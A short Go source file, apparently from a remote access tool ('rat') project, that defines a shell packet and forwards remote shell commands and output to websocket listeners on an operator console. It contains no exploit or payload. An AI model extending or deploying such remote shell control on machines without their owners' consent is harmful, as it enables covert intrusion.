package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ShellPacket struct {
	Action  int    `network:"send"`
	Command string `network:"send,receive"`
}

func (packet ShellPacket) Header() header.PacketHeader {
	return header.ShellHeader
}

func (packet ShellPacket) Init(c *Client) {

}

func (packet ShellPacket) OnReceive(c *Client) error {
	if ws, ok := c.Listeners[header.ShellHeader]; ok {
		event := newEvent(Shell, c.Id, packet.Command)

		return websocket.JSON.Send(ws, &event)
	}

	return nil
}
